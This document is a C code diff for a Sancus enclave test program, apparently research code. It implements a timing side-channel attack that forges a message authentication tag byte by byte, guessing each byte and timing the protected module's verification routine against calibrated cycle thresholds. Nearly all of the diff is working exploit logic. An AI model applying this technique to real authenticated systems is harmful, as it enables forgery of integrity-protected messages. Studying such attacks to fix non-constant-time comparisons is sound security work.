@@ -104,18 +104,51 @@ int main()
 
     puts("\n---");
     puts("[untrusted] calling ping SM..");
-    enter_ping();
+    // enter_ping();
 
     uint tsc1, tsc2;
     timer_tsc_start();
     tsc1 = timer_tsc_end();
     pr_info1("tsc overhead: %u\n", tsc1);
-    uint8_t __attribute__((aligned(2))) cipher[DATA_SIZE] = {0xAA, 0xBB};
+    uint8_t __attribute__((aligned(2))) cipher[DATA_SIZE] = {0xAB, 0xCD};
+    uint8_t __attribute__((aligned(2))) data[DATA_SIZE] = {0xAB, 0xCD};
     uint8_t __attribute__((aligned(2))) guess[DATA_SIZE + SANCUS_TAG_SIZE] = {0x0};
+    uint8_t __attribute__((aligned(2))) payload[DATA_SIZE + SANCUS_TAG_SIZE] = {0x0};
     
+    uint16_t nonce_rev = ((unsigned) 0) << 8 | ((unsigned) 0) >> 8;
+    sancus_wrap_with_key(key, &nonce_rev, sizeof(nonce_rev), data, DATA_SIZE, payload, payload + DATA_SIZE);
+    dump_buf(payload, DATA_SIZE + SANCUS_TAG_SIZE, "\tpayload");
+    // __sm_pong_handle_input(CONN_ID, payload, DATA_SIZE + SANCUS_TAG_SIZE);
+
+    guess[0] = payload[0];
+    guess[1] = payload[1];
+    for ( int e = 0; e <= SANCUS_TAG_SIZE/2; e++ ){
+        
+        timer_tsc_start();
+        __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
+        tsc2 = timer_tsc_end();
+        dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+        pr_info1("Time to verify guess: %u\n", tsc2);
+        guess[DATA_SIZE+2*e] = payload[DATA_SIZE+2*e];
+        guess[DATA_SIZE+2*e+1] = payload[DATA_SIZE+2*e+1];
+    }
+
     for( int i = 0; i < DATA_SIZE; i++ ){
         guess[i] = cipher[i];
     }
+
+    uint time_constant =
+        #if SANCUS_KEY_SIZE == 8
+            1040    ;
+        #else
+            2211;
+        #endif
+    uint time_constant2 =
+        #if SANCUS_KEY_SIZE == 8
+            93;
+        #else
+            173;
+        #endif
 
     for ( int e = 0; e < SANCUS_TAG_SIZE/2; e++ ){
         for( int i = 0; i < 256; i++ ){
@@ -126,16 +159,16 @@ int main()
                 timer_tsc_start();
                 __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
                 tsc2 = timer_tsc_end();
-                if( tsc2 > 2211 + e*173 ){
-                    // dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
-                    // pr_info1("Time to verify guess: %u\n", tsc2);
+                if( tsc2 > time_constant + e*time_constant2 ){
+                    dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+                    pr_info1("Time to verify guess: %u\n", tsc2);
                     break;
                 }
             }
-            // pr_info1("Finished %d/256\n", i+1);
-            if( tsc2 > 2211 + e*173 ){
-                // dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
-                // pr_info1("Time to verify guess: %u\n", tsc2);
+            pr_info1("Finished %d/256\n", i+1);
+            if( tsc2 > time_constant + e*time_constant2 ){
+                dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+                pr_info1("Time to verify guess: %u\n", tsc2);
                 break;
             }
         }
